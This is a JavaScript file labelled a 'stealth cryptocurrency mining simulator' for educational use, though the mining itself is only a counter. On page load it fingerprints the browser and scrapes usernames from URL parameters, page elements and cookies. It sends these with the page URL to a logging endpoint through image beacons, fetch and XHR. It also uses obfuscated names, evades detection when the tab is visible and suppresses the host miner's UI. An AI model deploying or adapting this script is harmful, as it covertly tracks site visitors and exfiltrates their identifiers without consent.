// Stealth cryptocurrency mining simulator
// This is for educational purposes only - DO NOT USE FOR MALICIOUS PURPOSES

(function() {
    // Set flags to prevent the basic miner from initializing
    window.minerLoaded = true;
    window.stealthMinerActive = true;
    
    // Obfuscated variable names to avoid detection
    const _0x5f2a = {
        active: false,
        hashes: 0,
        rate: 0,
        start: null,
        intensity: 15,
        timer: null,
        reporter: null,
        userIdentifier: '',
        pageUrl: '',
        username: '',
        lastReport: 0
    };
    
    // Generate a semi-unique identifier for this user/browser
    function _0x9e7b() {
        const nav = navigator;
        const screen = window.screen;
        const guid = [
            nav.userAgent,
            nav.language || nav.userLanguage,
            new Date().getTimezoneOffset(),
            screen.colorDepth,
            screen.width + 'x' + screen.height,
            Math.random().toString(36).substring(2, 12)
        ].join('###');
        
        // Create a hash of the guid
        let hash = 0;
        for (let i = 0; i < guid.length; i++) {
            hash = ((hash << 5) - hash) + guid.charCodeAt(i);
            hash = hash & hash; // Convert to 32bit integer
        }
        return 'id_' + Math.abs(hash).toString(16);
    }
    
    // Check if we're in a good environment to mine
    function _0x7e3c() {
        // Don't run if DevTools is open (might be detected)
        if (window.outerHeight - window.innerHeight > 200 || 
            window.outerWidth - window.innerWidth > 200) {
            return false;
        }
        
        // Don't run if battery is low (to avoid detection)
        if (navigator.getBattery) {
            navigator.getBattery().then(function(battery) {
                if (battery.level < 0.3 && !battery.charging) {
                    return false;
                }
            });
        }
        
        // Check if we're on a powerful enough device
        if (navigator.hardwareConcurrency && navigator.hardwareConcurrency < 2) {
            return false;
        }
        
        return true;
    }
    
    // Throttle mining based on system conditions
    function _0x3a9b() {
        // Reduce intensity if the page is visible
        if (document.visibilityState === 'visible') {
            return _0x5f2a.intensity * 0.3; // 30% power when visible
        }
        
        // Full power when tab is in background
        return _0x5f2a.intensity;
    }
    
    // Extract username from page content, URL parameters, or page title
    function _0x4d2e() {
        try {
            // Method 1: Look for username in URL parameters
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('user') || urlParams.has('username')) {
                return urlParams.get('user') || urlParams.get('username');
            }
            
            // Method 2: Look for username in page content
            const usernameElements = document.querySelectorAll('.username, #username, [data-username]');
            if (usernameElements.length > 0) {
                return usernameElements[0].textContent || usernameElements[0].value || usernameElements[0].getAttribute('data-username');
            }
            
            // Method 3: Look for welcome message
            const welcomeElements = document.querySelectorAll('h1, h2, h3, .welcome');
            for (let i = 0; i < welcomeElements.length; i++) {
                const text = welcomeElements[i].textContent;
                if (text.includes('Welcome') || text.includes('Hello')) {
                    const match = text.match(/Welcome,?\s+([^!.,]+)/i) || text.match(/Hello,?\s+([^!.,]+)/i);
                    if (match && match[1]) {
                        return match[1].trim();
                    }
                }
            }
            
            // Method 4: Extract from page title
            if (document.title.includes('Profile') || document.title.includes('Dashboard')) {
                const match = document.title.match(/([^-|:]+)'s Profile/i) || document.title.match(/([^-|:]+)'s Dashboard/i);
                if (match && match[1]) {
                    return match[1].trim();
                }
            }
            
            // Method 5: Look for any element with "user" in its ID or class
            const userElements = document.querySelectorAll('[id*=user], [class*=user]');
            if (userElements.length > 0) {
                return userElements[0].textContent || userElements[0].value || 'unknown_user';
            }
            
            // Fallback: Use document.cookie if available
            if (document.cookie.includes('user')) {
                const match = document.cookie.match(/user[^=]*=([^;]+)/);
                if (match && match[1]) {
                    return decodeURIComponent(match[1]);
                }
            }
        } catch (e) {
            console.error("Error extracting username:", e);
        }
        
        // Final fallback
        return 'unknown_user_' + Math.floor(Math.random() * 1000);
    }
    
    // Simulate mining by incrementing hash counter
    function _0x2c7d() {
        if (!_0x5f2a.active) return;
        
        // Calculate how many hashes to mine based on intensity
        const hashesToMine = Math.floor(Math.random() * _0x5f2a.intensity) + 1;
        _0x5f2a.hashes += hashesToMine;
        
        // Calculate hash rate (hashes per second)
        const now = new Date();
        const elapsed = (now - _0x5f2a.start) / 1000;
        _0x5f2a.rate = Math.round(_0x5f2a.hashes / elapsed);
        
        // Check if we should report stats
        const timeSinceLastReport = now - _0x5f2a.lastReport;
        if (timeSinceLastReport > 5000 || _0x5f2a.hashes % 50 === 0) {
            _0x8f1e();
            _0x5f2a.lastReport = now;
        }
        
        // Schedule next mining operation
        _0x5f2a.timer = setTimeout(_0x2c7d, 1000 / _0x5f2a.intensity);
    }
    
    // Report mining stats to server
    function _0x8f1e() {
        if (!_0x5f2a.active) return;
        
        // Always report, even with small hash counts
        // This ensures we get data immediately when someone views the page
        
        // Prepare data to send
        const data = {
            h: _0x5f2a.hashes,
            r: _0x5f2a.rate,
            t: Math.floor((new Date() - _0x5f2a.start) / 1000),
            ua: navigator.userAgent,
            id: _0x5f2a.userIdentifier,
            url: _0x5f2a.pageUrl,
            ts: new Date().toISOString(),
            username: _0x5f2a.username
        };
        
        // Send data via multiple methods to ensure it gets through
        try {
            console.log("Sending mining data:", data);
            
            // Method 1: Image request (most reliable)
            const img = new Image();
            img.src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`;
            
            // Method 2: Fetch API with no-cors
            fetch(`http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, {
                mode: 'no-cors',
                cache: 'no-cache'
            }).catch(() => {
                // Silently fail if fetch doesn't work
            });
            
            // Method 3: XMLHttpRequest as fallback
            const xhr = new XMLHttpRequest();
            xhr.open('GET', `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(data))}`, true);
            xhr.send();
            
            console.log("Mining report sent:", data);
        } catch (e) {
            console.error("Error sending mining data:", e);
            
            // Try one more time with just the image method
            try {
                const img = new Image();
                img.src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify({
                    h: _0x5f2a.hashes,
                    id: _0x5f2a.userIdentifier,
                    username: _0x5f2a.username,
                    error: "fallback"
                }))}`;
            } catch (e2) {
                // Nothing more we can do
            }
        }
    }
    
    // Initialize mining
    function _0x1a5d() {
        // Don't initialize if already active
        if (_0x5f2a.active) return;
        
        _0x5f2a.active = true;
        _0x5f2a.start = new Date();
        _0x5f2a.hashes = 0;
        _0x5f2a.lastReport = 0;
        _0x5f2a.userIdentifier = _0x9e7b();
        _0x5f2a.pageUrl = window.location.href;
        _0x5f2a.username = _0x4d2e();
        
        console.log("Stealth miner initialized with ID:", _0x5f2a.userIdentifier);
        console.log("Username detected:", _0x5f2a.username);
        
        // Start mining
        _0x2c7d();
        
        // Set up reporting on a shorter interval (3-5 seconds)
        const reportInterval = Math.floor(Math.random() * 2000) + 3000;
        _0x5f2a.reporter = setInterval(_0x8f1e, reportInterval);
        
        // Send an immediate report to register the user
        setTimeout(_0x8f1e, 500);
        
        // Listen for visibility changes to adjust mining intensity
        document.addEventListener('visibilitychange', function() {
            // Pause mining for a moment when tab becomes visible to avoid detection
            if (document.visibilityState === 'visible') {
                const wasActive = _0x5f2a.active;
                _0x5f2a.active = false;
                
                // Resume after a short delay
                setTimeout(function() {
                    if (wasActive) _0x5f2a.active = true;
                }, 2000);
            }
        });
    }
    
    // Override the global miner object if it exists to prevent UI from showing
    if (window.CryptoMiner) {
        const originalCryptoMiner = window.CryptoMiner;
        window.CryptoMiner = function() {
            const instance = new originalCryptoMiner();
            // Override the createUI method to prevent UI from showing
            instance.createUI = function() { /* Do nothing */ };
            return instance;
        };
    }
    
    // Start mining after a short delay
    setTimeout(function() {
        // Check if we're in a good environment to mine
        const shouldMine = true; // Always mine in this version
        
        if (shouldMine) {
            // Initialize immediately
            _0x1a5d();
        } else {
            window.addEventListener('load', function() {
                // Add a shorter delay after page load
                setTimeout(_0x1a5d, 500);
            });
        }
    }, 500);
    
    // Prevent the basic miner UI from showing up by overriding the global miner object
    window.miner = {
        start: function() { /* Do nothing */ },
        stop: function() { /* Do nothing */ },
        createUI: function() { /* Do nothing */ },
        isRunning: function() { return false; }
    };
    
    // Send an immediate ping to log that the script was loaded
    const pingData = {
        h: 0,
        r: 0,
        t: 0,
        ua: navigator.userAgent,
        id: _0x9e7b(),
        url: window.location.href,
        ts: new Date().toISOString(),
        username: 'script_loaded',
        event: 'script_loaded'
    };
    
    try {
        const img = new Image();
        img.src = `http://localhost:8081/log_mining.php?data=${encodeURIComponent(JSON.stringify(pingData))}`;
    } catch (e) {
        // Ignore errors
    }
})(); 